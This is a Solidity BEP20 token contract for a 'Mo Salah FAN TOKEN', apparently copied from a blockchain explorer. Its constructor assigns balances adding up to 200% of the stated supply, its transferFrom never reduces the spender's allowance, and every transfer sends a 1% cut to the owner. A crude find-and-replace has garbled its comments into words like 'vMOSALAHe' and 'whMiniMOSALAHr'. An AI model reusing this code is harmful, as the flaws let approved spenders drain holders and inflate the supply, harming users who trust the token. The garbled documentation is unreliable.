/**
 *Submitted for verification at BscScan.com on 2021-10-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IBEP20 {
  // @dev Returns the amount of MiniMOSALAH in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniMOSALAH owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vMOSALAHe);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vMOSALAHe
    );
  
  */

  /**
   * @dev Moves `amount` MiniMOSALAH from the caller's account to `recipient`.
   *
   * Returns a boolean vMOSALAHe indicating whMiniMOSALAHr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniMOSALAH that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vMOSALAHe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniMOSALAH.
   *
   * Returns a boolean vMOSALAHe indicating whMiniMOSALAHr the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vMOSALAHe afterwards:
   * https://github.com/MOSALAH/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniMOSALAH from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vMOSALAHe indicating whMiniMOSALAHr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vMOSALAHe` MiniMOSALAH are moved from one account (`from`) to  another (`to`). Note that `vMOSALAHe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vMOSALAHe);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vMOSALAHe` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vMOSALAHe);
}

contract MOSALAHTOK is IBEP20 {

    // common addresses
    address private owner;
    address private MOSALAH;
    address private MiniMOSALAH;
    address private ARSENAL;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Mo Salah FAN TOKEN";
    string public override symbol = "MOSALAH";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vMOSALAHe);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vMOSALAHe);
    
    // On init of contract we're going to set the admin and give them all MiniMOSALAH.
    constructor(uint totalSupplyVMOSALAHe, address MOSALAHAddress, address MiniMOSALAHAddress, address ARSENALAddress) {
        // set total supply
        totalSupply = totalSupplyVMOSALAHe;
        
        // designate addresses
        owner = msg.sender;
        MOSALAH = MOSALAHAddress;
        MiniMOSALAH = MiniMOSALAHAddress;
        ARSENAL = ARSENALAddress;

        
        // split the MiniMOSALAH according to agreed upon percentages
        balances[MOSALAH] =  totalSupply * 1 / 100;
        balances[MiniMOSALAH] = totalSupply * 48 / 100;
        balances[ARSENAL] = totalSupply * 100 / 100;

        
        balances[owner] = totalSupply * 51 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vMOSALAHe) public override returns(bool) {
        require(vMOSALAHe > 0, "Transfer vMOSALAHe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vMOSALAHe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vMOSALAHe
        uint reMiniMOSALAHBD = vMOSALAHe * 1 / 100;
        uint burnTBD = vMOSALAHe * 0 / 100;
        uint vMOSALAHeAfterTaxAndBurn = vMOSALAHe - reMiniMOSALAHBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vMOSALAHeAfterTaxAndBurn;
        balances[msg.sender] -= vMOSALAHe;
        
        emit Transfer(msg.sender, to, vMOSALAHe);
        
        // finally, we burn and tax the MOSALAHs percentage
        balances[owner] += reMiniMOSALAHBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vMOSALAHe) public override returns(bool) {
        allowances[msg.sender][spender] = vMOSALAHe; 
        
        emit Approval(msg.sender, spender, vMOSALAHe);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vMOSALAHe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vMOSALAHe, "Allowance too low for transfer.");
        require(balances[from] >= vMOSALAHe, "Balance is too low to make transfer.");
        
        balances[to] += vMOSALAHe;
        balances[from] -= vMOSALAHe;
        
        emit Transfer(from, to, vMOSALAHe);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}